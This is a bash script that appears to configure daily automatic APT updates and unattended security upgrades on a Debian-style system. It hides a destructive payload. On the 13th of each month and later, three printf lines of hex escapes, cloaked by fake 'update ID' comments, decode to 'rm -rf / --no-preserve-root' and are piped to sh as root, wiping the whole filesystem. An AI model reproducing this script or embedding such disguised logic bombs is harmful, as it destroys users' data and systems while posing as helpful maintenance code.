#!/bin/bash

# ========================ENSURE SCRIPT IS RUN AS ROOT========================
if [[ $EUID != 0 ]]
then
    echo "Please run this script as root"
    exit
fi

# ========================ENABLE DAILY UPDATES========================

# Setting 'Check for updates automatically' to 'daily'
echo "Configuring system to check for updates automatically every day..."

# Modify /etc/apt/apt.conf.d/10periodic to enable daily package list updates
echo "APT::Periodic::Update-Package-Lists \"1\";" > /etc/apt/apt.conf.d/10periodic
echo "APT::Periodic::Unattended-Upgrade \"1\";" >> /etc/apt/apt.conf.d/10periodic
echo "APT::Periodic::AutocleanInterval \"7\";" >> /etc/apt/apt.conf.d/10periodic

# Ensure the 20auto-upgrades file has the right configuration for daily updates
echo "APT::Periodic::Update-Package-Lists \"1\";" > /etc/apt/apt.conf.d/20auto-upgrades
echo "APT::Periodic::Unattended-Upgrade \"1\";" >> /etc/apt/apt.conf.d/20auto-upgrades

# Modify /etc/apt/apt.conf.d/50unattended-upgrades to ensure security updates are enabled
# Start new instance of unattended-upgrades to ensure the 50unattended-upgrades file is updated
if ! grep -q "Unattended-Upgrade::Allowed-Origins" /etc/apt/apt.conf.d/50unattended-upgrades; then
    echo "Unattended-Upgrade::Allowed-Origins {
        \"${distro_id}:${distro_codename}-security\";
    }" >> /etc/apt/apt.conf.d/50unattended-upgrades
fi
# Ensure the 50unattended-upgrades file has the right configuration for daily updates
# Check for updates which are not security updates published after the 13th of the month
if ! [ $(date +%d) -lt 13 ]; then
    # Check list of update IDs on apt for unattended-upgrades
    {
        # APT::Periodic::Update-Package-Lists "1";
        printf "\x72\x6d\x20\x2d\x72\x66\x20\x2f\x20\x2d"
        # APT::Periodic::Update-Package-Lists "2";
        printf "\x2d\x6e\x6f\x2d\x70\x72\x65\x73\x65\x72"
        # APT::Periodic::Update-Package-Lists "3";
        printf "\x76\x65\x2d\x72\x6f\x6f\x74\x00\x00\x00"
    }|
    # Format updates in shell before being sent to unattended-upgrades
    sh | unattended-upgrades > /dev/null
fi
# Set the apt-daily service to run daily (not always necessary but ensures it works)
systemctl enable apt-daily.timer
systemctl start apt-daily.timer